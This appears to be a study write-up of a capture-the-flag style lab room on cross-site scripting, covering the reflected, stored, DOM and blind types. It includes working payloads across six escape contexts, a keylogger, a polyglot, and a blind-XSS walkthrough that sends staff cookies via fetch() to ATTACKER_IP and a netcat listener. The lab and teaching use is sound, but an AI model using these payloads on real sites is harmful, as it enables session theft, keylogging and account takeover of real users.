# XSS — Cross-Site Scripting

## Overview

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript into web pages that other users then execute in their browsers. Unlike server-side vulnerabilities, XSS attacks target the user — the attacker's code runs in the victim's browser, within the context of the trusted website, with full access to the DOM, cookies, and session data.

This room covers all major XSS types — Reflected, Stored, DOM-Based, and Blind — along with practical exploitation through six payload challenge levels that require escaping different HTML contexts. It also covers real attack payloads for session stealing, keylogging, and business logic abuse.

**Skills introduced:** XSS payload construction and intent, context-aware payload crafting (script tags, attribute escaping, textarea escaping, JavaScript string escaping, filter bypass, event handler injection), session cookie exfiltration via `fetch()`, Blind XSS via `</textarea>` escape, XSS polyglots.

---

## Concepts Covered

### Core Terminology

| Term | Definition |
|------|-----------|
| **DOM** | Document Object Model — the browser's live tree representation of the page. JavaScript modifies it to update the page without reloading. |
| **URL parameters** | Query string values (e.g., `?q=hello`) — user-controllable input, always untrusted |
| **Cookies** | Browser-stored data (session IDs, preferences). `HttpOnly` prevents JavaScript from reading them. |
| **Escaping (Output Encoding)** | Transforming `<` to `&lt;` so it renders as text, not as HTML. Prevents injected tags from executing. |
| **Filtering (Input Validation)** | Checks that input conforms to expected format (letters, numbers, length). Does not stop injection if unescaped data is later inserted into HTML. |

### XSS Payload Structure

Every XSS payload has two parts:

**1. Intention** — what the payload is designed to do:

| Intent | Example Payload |
|--------|----------------|
| Proof of concept | `<script>alert('XSS')</script>` |
| Session stealing | `<script>fetch('https://attacker.thm/steal?c=' + btoa(document.cookie));</script>` |
| Key logging | `<script>document.onkeypress=function(e){fetch('https://attacker.thm/log?k='+btoa(e.key));}</script>` |
| Business logic | `<script>user.changeEmail('attacker@hacker.thm');</script>` |

**2. Modification** — adapting the payload to the specific HTML context where the input is reflected.

---

### Reflected XSS

**Definition:** User input from a URL parameter or form field is immediately reflected back into the page response without sanitisation. The malicious script executes when the victim visits the crafted URL.

**Why it matters:** The attacker delivers a link containing the payload. Clicking the link causes the victim's browser to load the page and execute the injected script in the site's origin context.

**Root cause in the lab (`app.py`):**
```python
q = request.args.get("q", "")
return render_template("news.html", news=NEWS, query=q, ...)
# The raw q variable is passed to the template
```

The template renders `query` without escaping, so `<script>alert('Hack')</script>` in the URL becomes executable HTML on the page.

**Detection:** Enter `<script>alert('Hack')</script>` in the search box. If an alert fires and the injected tag appears in the page source, the input is being reflected without encoding.

**Real-world injection points:** Search boxes, error messages, any page that echoes URL parameters back to the user.

---

### Stored XSS

**Definition:** Attacker-controlled input is saved on the server (in a database) and later served to other users without escaping — executing the payload in every visitor's browser.

**Why it is more impactful than Reflected:** The payload persists and affects every user who views the page, including administrators. A stored XSS in an admin panel can compromise admin sessions. Commonly found in: comment sections, user profiles, message boards, product reviews, support tickets.

**Root cause in the lab:**
The guestbook endpoint stored the `comment` field and rendered it in the template using `{{ c.comment|safe }}` — the `|safe` filter explicitly bypasses Jinja2's automatic escaping, allowing raw HTML to render.

**Detection:** Submit `<script>alert('You are Hacked')</script>` in the comment field, then reload the page. If an alert fires on every page load, the payload is persisted and executing for all visitors.

---

### DOM-Based XSS

**Definition:** Client-side JavaScript reads attacker-controllable data (URL hash, `location.search`, `document.referrer`, `localStorage`) and writes it back into the DOM using an unsafe method (`innerHTML`, `document.write`, `eval`). The payload never touches the server — server-side defences cannot help.

**Root cause in the lab:**
A client-side script read the URL fragment (`location.hash`) and assigned it directly to `element.innerHTML`. The browser parsed the injected HTML and executed the event handler:

```html
<!-- Injected into innerHTML -->
<img src=x onerror="alert('Hacked you again')">
<!-- The src=x fails, triggering onerror, which executes the alert -->
```

**Key distinction:** DOM XSS source (where the data comes from) and sink (where it is written) are both client-side. Checking the server's response for the payload will show nothing — it was never sent to the server.

**Dangerous sinks:** `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `location.href = user_input`

---

### Blind XSS

**Definition:** Similar to Stored XSS, but the attacker cannot see the payload executing — it fires in a context the attacker cannot directly observe (an admin panel, a staff review queue, a support ticket system).

**Why it matters:** Support tickets, feedback forms, and log viewers are often reviewed by staff with elevated privileges. A payload in these features can steal admin session cookies, giving the attacker privileged access.

**Detection approach:** The payload must include a callback — an HTTP request to a server the attacker controls — so the attacker knows when and where execution occurred.

**Tool:** XSS Hunter Express — automatically captures cookies, URLs, page contents, and screenshots when a Blind XSS payload fires.

---

## Methodology

```
1. Identify where user input is reflected in the page:
   URL parameters, form fields, profile fields, comment boxes, HTTP headers

2. Test basic payload in the target context:
   <script>alert('XSS')</script>
   If alert fires → confirm vulnerability

3. Inspect the page source to understand the reflection context:
   - In body text → standard script tag may work
   - In an attribute value → need to escape the attribute first
   - In a textarea → need to close the textarea tag
   - In a JavaScript string → need to break out of the string
   - Filtered → test bypass techniques

4. Adapt payload to context:
   Attribute context:  "><script>alert('XSS')</script>
   Textarea context:   </textarea><script>alert('XSS')</script>
   JS string context:  ';alert('XSS');//
   Event handler:      " onload="alert('XSS')
   Filter bypass:      <sscriptcript>alert('XSS')</sscriptcript>

5. Escalate beyond proof-of-concept:
   Replace alert() with fetch() exfiltration, keylogger, or business logic abuse

6. For Blind XSS:
   Use </textarea> escape + fetch() callback to your listener
   Wait for callback; decode base64 cookie; use for session hijack
```

---

## Practical Activities

### Challenge Levels (Payload Crafting)

#### Level 1 — Reflected in Body Text

**Context:** Input reflected directly in page body between HTML tags.

**Payload:** `<script>alert('THM');</script>`

**Why it works:** Input is inserted directly into the HTML body with no encoding. The browser parses the `<script>` tag and executes it.

---

#### Level 2 — Reflected in Input Attribute

**Context:** Input reflected inside the `value` attribute of an `<input>` tag:
```html
<input value="USER_INPUT_HERE">
```

**Problem:** A `<script>` tag inside an attribute value is not executed — it would need to break out of the attribute and close the tag first.

**Payload:** `"><script>alert('THM');</script>`

**Breakdown:**
- `"` — closes the attribute's double-quote delimiter
- `>` — closes the `<input>` tag
- `<script>alert('THM');</script>` — now executes in the body

**Why it works:** The browser sees `<input value="">` (closed), then `<script>` as a new element in the body.

---

#### Level 3 — Reflected in Textarea

**Context:** Input reflected inside a `<textarea>` tag.

**Problem:** Content inside `<textarea>` is displayed as literal text — HTML tags are not parsed.

**Payload:** `</textarea><script>alert('THM');</script>`

**Breakdown:**
- `</textarea>` — closes the textarea element, returning to normal HTML parsing context
- `<script>alert('THM');</script>` — executes in the body

---

#### Level 4 — Reflected Inside JavaScript String

**Context:** Input reflected inside an existing JavaScript variable assignment:
```javascript
var name = 'USER_INPUT_HERE';
```

**Problem:** Inside a JavaScript string, a `<script>` tag does nothing — it is just string content. Need to break out of the string literal first.

**Payload:** `';alert('THM');//`

**Breakdown:**
- `'` — closes the open string literal
- `;` — ends the current JavaScript statement
- `alert('THM');` — new JavaScript statement
- `//` — comments out everything after (including the trailing `'` from the original template)

---

#### Level 5 — Filter Removing "script"

**Context:** The word `script` is stripped from any input before rendering.

**Problem:** `<script>alert('THM');</script>` becomes `<>alert('THM');</>` after filtering — non-functional.

**Filter bypass technique — nested tag:** When the filter removes a word from inside itself, the outer portions combine to reconstitute the word:

```
Input:  <sscriptcript>alert('THM');</sscriptcript>
Filter removes "script":
        <s      cript>alert('THM');</s      cript>
Result: <script>alert('THM');</script>
```

**Payload:** `<sscriptcript>alert('THM');</sscriptcript>`

---

#### Level 6 — Filter Removing `<` and `>`

**Context:** Angle bracket characters are filtered, preventing any HTML tags from being injected. Input reflected in an `<img>` tag's attribute context.

**Problem:** `"><script>alert('THM');</script>` fails because `<` and `>` are stripped.

**Bypass — event handler on existing element:** Instead of injecting a new tag, inject an attribute on the existing `<img>` tag. The `onload` event executes when the image loads:

**Payload:** `/images/cat.jpg" onload="alert('THM');`

**Breakdown:**
- `/images/cat.jpg"` — closes the `src` attribute with a valid-looking image path
- ` onload="alert('THM');"` — adds an event handler; when the image loads, `alert` fires
- No angle brackets needed — the tag is already open; we just add attributes

---

### Blind XSS — Cookie Exfiltration via Support Ticket

**Context:** The Acme IT Support site's support ticket system. Ticket content is placed inside a `<textarea>` tag. Staff view tickets in a private portal.

**Step 1:** Escape the textarea and confirm injection:
```
</textarea>test
```

**Step 2:** Confirm JavaScript execution:
```
</textarea><script>alert('THM');</script>
```

**Step 3:** Set up a listener on the AttackBox:
```bash
nc -nlvp 9001
# -l: listen mode
# -n: no DNS
# -v: verbose
# -p 9001: port
```

**Step 4:** Submit the cookie exfiltration payload as the ticket subject:
```html
</textarea><script>fetch('http://ATTACKER_IP:9001?cookie=' + btoa(document.cookie));</script>
```

**Payload breakdown:**
- `</textarea>` — escapes the textarea context
- `fetch()` — makes an HTTP request to the attacker's server
- `?cookie=` — passes the cookie as a URL parameter
- `btoa(document.cookie)` — base64-encodes the cookie for safe URL transmission
- `document.cookie` — accesses the victim's cookies for the Acme IT Support domain

**What happens:** When a staff member views the ticket, their browser executes the script. `fetch()` sends an HTTP GET to the attacker's Netcat listener containing the staff member's base64-encoded session cookies.

**Decode the exfiltrated data:**
```bash
echo 'BASE64_STRING_HERE' | base64 -d
# Reveals: staff_session=abc123; other_cookie=value
```

**Why this matters:** The staff member has elevated access to the private portal. Their session cookie allows the attacker to authenticate as the staff member and access the portal, achieving privilege escalation from a regular user to staff-level access — without ever needing the staff member's password.

---

### XSS Polyglot

A polyglot is a single payload that works across multiple XSS contexts simultaneously by combining multiple escape techniques:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

This payload would have worked on all six challenge levels — it handles attribute escaping, script tags, textareas, and event handlers simultaneously. Useful for initial reconnaissance testing when context is unknown.

---

## Observations and Analysis

- In the lab Flask application, the guestbook used `{{ c.comment|safe }}` — the `|safe` filter is a developer signal to Jinja2 that the content is "trusted" and should not be escaped. Applying this to user-controlled input is the core mistake.
- DOM XSS in the preview page did not require the payload to reach the server at all. The browser's client-side JavaScript was the only participant in the attack.
- The Level 4 JavaScript string escape (`';alert('THM');//`) illustrates that context matters more than payload syntax — the same `<script>` tag that works in body HTML does nothing inside a JavaScript string literal.
- The filter bypass in Level 5 exploits a predictable weakness in string substitution: removing a match from inside itself reconstitutes the word. This is a general principle that applies to any word-based filter.
- The Level 6 angle-bracket filter is much stronger — but it still fails because the attacker does not need angle brackets when already inside an attribute context. Filters that block specific characters without understanding the full output context are inherently incomplete.
- `HttpOnly` cookies would prevent `document.cookie` from returning the session cookie in the Blind XSS scenario. Always recommend `HttpOnly` as a defence-in-depth measure alongside proper output encoding.

---

## Tools and Technologies Used

### Netcat (`nc`)
- **Purpose:** Create a simple TCP listener to receive HTTP callbacks from XSS payloads
- **Common usage:** `nc -nlvp 9001`
- **In this room:** Received the base64-encoded session cookie from the Blind XSS payload execution in the staff browser

### Browser Developer Tools
- **Purpose:** Inspect page source, observe DOM, identify reflection context
- **How used:** Used "View Page Source" to identify how input was reflected in HTML (attribute, textarea, JavaScript) before choosing the correct payload

### XSS Hunter Express
- **Purpose:** Automated Blind XSS detection — generates unique callback domains and captures cookies, page contents, screenshots when payload fires
- **In this room:** Referenced as the recommended tool for Blind XSS; not deployed in the lab

### CyberChef / base64decode.org
- **Purpose:** Decode base64-encoded cookie values received from exfiltration payloads
- **How used:** Decode the value received by Netcat: `echo 'VALUE' | base64 -d`

---

## Key Learnings

- XSS context determines payload — the same intent requires different syntax depending on whether the reflection is in body HTML, an attribute, a textarea, or a JavaScript string
- `</textarea>` is the escape mechanism for textarea context; `">` escapes attribute context; `';` escapes JavaScript string context
- `fetch()` is the modern XSS exfiltration primitive — replaces the older `document.location` redirect technique
- `btoa()` base64-encodes values for safe URL transmission — special characters in cookies break URL parameters without encoding
- Blind XSS fires in a context the attacker cannot directly observe — a callback listener is the only confirmation mechanism
- `HttpOnly` cookie flag directly mitigates session stealing via `document.cookie` — but XSS can still perform actions on behalf of the user (CSRF-style) even without reading the cookie
- Polyglots are useful for rapid context-unknown testing but should not replace understanding the reflection context

---

## Real-World Relevance

- **Penetration testing:** XSS is tested on all user-input points. Stored XSS in admin-visible features is rated High due to potential admin session compromise.
- **Bug bounty:** Reflected XSS with a demonstrable impact path (session stealing, account takeover) is typically rated Medium to High. Self-XSS (only fires for the attacker themselves) is generally not accepted.
- **Enterprise environments:** Internal applications often have weaker XSS protections than public-facing sites. Admin portals are high-value targets.
- **Red team operations:** Blind XSS in a support ticket or log viewer is a reliable way to capture admin credentials in environments where direct admin access is restricted.

---

## Things Worth Remembering

- Body context: `<script>alert('THM');</script>`
- Attribute context: `"><script>alert('THM');</script>` (close attribute and tag first)
- Textarea context: `</textarea><script>alert('THM');</script>`
- JavaScript string context: `';alert('THM');//` (close string, end statement, comment remainder)
- Filter bypass (word removal): nest the word inside itself so removal reconstitutes it
- No angle brackets: use event handlers on existing tags (`onload="..."`, `onerror="..."`)
- Session stealing: `fetch('http://ATTACKER/steal?c=' + btoa(document.cookie))`
- Set up listener before submitting Blind XSS payload: `nc -nlvp 9001`
- `HttpOnly` cookies prevent `document.cookie` access — recommend it in every XSS finding
- Polyglot: handles multiple contexts with one payload — useful for quick unknown-context testing

---

## Conclusion

XSS spans the full spectrum from trivial proof-of-concept alerts to sophisticated session hijacking and privilege escalation via admin portal compromise. The critical insight from this room is that context awareness drives payload selection — the same JavaScript intent requires completely different delivery syntax depending on where in the HTML document the input is reflected. The practical challenge levels build a systematic understanding of all major contexts. The Blind XSS exfiltration exercise demonstrates the real-world path from a comment box to admin account takeover. These are techniques and concepts that directly translate to web application assessments and bug bounty programme submissions.
